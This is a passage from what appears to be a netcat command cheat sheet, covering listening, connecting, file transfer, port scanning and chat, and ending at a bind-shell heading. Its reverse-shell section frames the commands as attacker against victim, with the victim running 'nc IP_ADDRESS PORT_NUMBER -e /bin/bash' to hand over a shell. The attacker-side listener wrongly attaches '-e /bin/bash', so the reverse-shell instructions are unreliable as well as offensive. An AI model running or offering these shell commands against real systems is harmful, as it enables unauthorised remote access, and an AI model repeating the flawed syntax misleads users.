nc -l -p PORT_NUMBER

# Connect to a TCP server on a specified IP address and port
nc IP_ADDRESS PORT_NUMBER

# Transfer a file from a server to a client
# On the server side (listening and sending the file)
nc -l -p PORT_NUMBER < filename
# On the client side (receiving the file)
nc IP_ADDRESS PORT_NUMBER > filename

# Scan open ports on a target host
nc -zv IP_ADDRESS PORT_RANGE

# Use netcat as a simple chat tool
# On one machine (listening)
nc -l -p PORT_NUMBER
# On another machine (connecting to the listener)
nc IP_ADDRESS PORT_NUMBER

# Create a reverse shell from a client to a server
# On the attacker's machine (listening)
nc -l -p PORT_NUMBER -e /bin/bash
# On the victim's machine (connecting back to the attacker's machine)
nc IP_ADDRESS PORT_NUMBER -e /bin/bash

# Bind shell on the server side
# On the server machine (listening and attaching a shell)
